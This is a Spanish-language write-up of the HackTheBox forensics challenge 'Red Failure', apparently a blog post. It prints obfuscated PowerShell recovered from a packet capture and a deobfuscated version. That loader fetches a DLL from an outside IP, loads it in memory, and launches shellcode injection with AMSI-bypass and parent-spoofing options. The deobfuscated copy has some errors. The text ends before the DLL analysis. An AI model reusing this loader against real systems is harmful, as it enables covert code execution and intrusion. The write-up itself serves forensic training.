---
title: Red Failure
description: >
  HackTheBox Forensics Challenge - Medium<br>
  [Challenge Download](https://app.hackthebox.com/challenges/291)
date: 2024-05-08
weight: 10
tags: ["htb","forensics","medium", "deobfuscation"]
---

---
# Enunciado del problema

During a recent red team engagement one of our servers got compromised. Upon completion the red team should have deleted any malicious artifact or persistence mechanism used throughout the project. However, our engineers have found numerous of them left behind. It is therefore believed that there are more such mechanisms still active. Can you spot any, by investigating this network capture?

---
# Resolución

Analizando con detalle la captura de paquetes que nos es entregada (**pcap**), en la conversación entre *10.0.2.15* y *147.182.172.189*, obtendremos una  filtración del código powershell:

```powershell
sV ("{0}{1}" -f'Y','uE51') ([typE]("{5}{0}{2}{3}{1}{4}"-f 'STeM','EcTIOn.aS','.REF','L','SemblY','Sy')); ${a} = ("{0}{1}{2}{3}{4}" -f 'cu','rr','en','tth','read')

${B} = ("{1}{0}{3}{2}" -f '.182.1','147','89','72.1')
${C} = 80
${D} = ("{2}{0}{1}" -f '.dl','l','user32')
${E} = ("{1}{0}" -f 'tVI0','9')
${f} = (('z6'+'4&Rx27Z{0}B%'+'7'+'3u'+'p') -F[cHar]36)
${g} = ((("{8}{5}{3}{1}{2}{0}{7}{4}{6}"-f '2','owsf3h','System3','d','svcho','Win','st.exe','f3h','C:f3h'))."r`EPlAcE"('f3h',[StRINg][ChaR]92))
${h} = ("{0}{1}"-f 'notepa','d')
${I} = ("{1}{0}"-f'xplorer','e')
${j} = ("{1}{0}{2}" -f'_','msvcp','win.dll')
${k} = ("{0}{1}" -f 'Tru','e')
${l} = ("{1}{0}" -f'rue','T')

${Me`Th`ODS} = @(("{1}{0}{2}{3}"-f'ot','rem','et','hread'), ("{2}{0}{1}{3}" -f'mo','tethre','re','addll'), ("{4}{2}{1}{3}{0}" -f'view','hr','otet','ead','rem'), ("{1}{3}{2}{4}{0}"-f 'ed','rem','e','ot','threadsuspend'))

if (${m`E`ThOdS}.("{0}{1}{2}"-f'C','ontain','s').Invoke(${A})) {
	${h} = (&("{1}{0}{2}{3}" -f'tart-Pro','S','c','ess') -WindowStyle ("{1}{0}{2}"-f 'dd','Hi','en') -PassThru ${H})."I`d"
}
${ME`ThODS} = @(("{2}{0}{4}{3}{1}" -f'mo','dapc','re','ethrea','t'), ("{1}{0}{2}{3}{4}" -f 'adc','remotethre','on','te','xt'), ("{2}{0}{3}{1}" -f'oces','hollow','pr','s'))

if (${m`EthODS}.("{0}{1}{2}"-f 'C','ontain','s').Invoke(${a})) {
	try {
		${I} = (&("{1}{0}{2}{3}" -f'-Pr','Get','o','cess') ${I} -ErrorAction ("{1}{0}"-f'p','Sto'))."ID"
	} catch {
		${I} = 0
	}
}

${c`MD} = "${A} /sc:http://${B}:${C}/${E} /password:${F} /image:${G} /pid:${H} /ppid:${I} /dll:${J} /blockDlls:${K} /am51:${L}"
${d`AtA} = (.("{0}{1}" -f 'IW','R') -UseBasicParsing "http://${B}:${C}/${D}")."C`ontEnT"
${A`ssEM} = ( ls ("{1}{3}{2}{0}" -f '1','vaR','5','IaBLe:yUE') )."Va`LUe"::("{1}{0}"-f'd','Loa').Invoke(${d`AtA})
${fL`AGS} = [Reflection.BindingFlags] ("{1}{2}{3}{4}{0}"-f'tatic','NonPub','l','ic,','S')
${cl`ASs} = ${a`s`SEm}.("{2}{1}{0}" -f 'pe','etTy','G').Invoke(("{0}{3}{1}{4}{2}"-f 'DIn','.Det','r','jector','onato'), ${f`lAgS})
${En`TRY} = ${C`lASS}.("{3}{1}{0}{2}"-f 'e','M','thod','Get').Invoke(("{1}{0}" -f 'om','Bo'), ${f`L`AGS})
${Ent`RY}."I`N`VokE"(${nU`LL}, (, ${c`md}.("{1}{0}" -f 'it','Spl').Invoke(" ")))
```

Explicado en otros blogs, desobfuscamos rápidamente el código para que sea legible:

```powershell
$assemblyType = [System.Reflection.Assembly]
$currentThread = [System.Threading.Thread]::CurrentThread

$ipAddress = "147.182.172.189"
$port = 80
$user32Dll = "user32.dll"
$notepadExe = "notepad"
$explorerExe = "explorer"
$msvcpWinDll = "msvcp_win.dll"
$blockDlls = $true
$am51 = $true

$methods = @(
    "remoteotethread",
    "remotethreadaddll",
    "remotethreadview",
    "remoteotethreadsuspend"
)


if ($methods.Contains("currentthread")) {
    $notepadId = (Start-Process -FilePath "notepad" -WindowStyle Hidden -PassThru).Id
}

$methods = @(
    "remoteethreatmo",
    "remotethreadcontext",
    "processhollow"
)

if ($methods.Contains("currentthread")) {
    try {
        $explorerId = (Get-Process -Name "explorer" -ErrorAction Stop).Id
    } catch {
        $explorerId = 0
    }
}

$cmd = "$currentThread /sc:http://$ipAddress:$port/9tVI0 /password:z6&R%73up /image:C:\Windows\System32\svchost.exe /pid:$notepadId /ppid:$explorerId /dll:$msvcpWinDll /blockDlls:$blockDlls /am51:$am51"

$data = Invoke-WebRequest -Uri "http://$ipAddress:$port/user32.dll" -UseBasicParsing
$content = $data.Content

$loadedAssembly = [System.Reflection.Assembly]::Load([System.Convert]::FromBase64String($content))
$bindingFlags = [Reflection.BindingFlags]::NonPublic, [Reflection.BindingFlags]::Static

$injectorClass = $loadedAssembly.GetType("DIn.Detonator").GetMethod("Bo", $bindingFlags)
$injectorClass.Invoke($null, $cmd.Split(" "))
```

Además del código en powershell, encontramos el archivo: **user32.dll**, mencionado en el script anteriormente mencionado, con dnSpy haremos un poco de ingeniería inversa para ver dicho archivo:

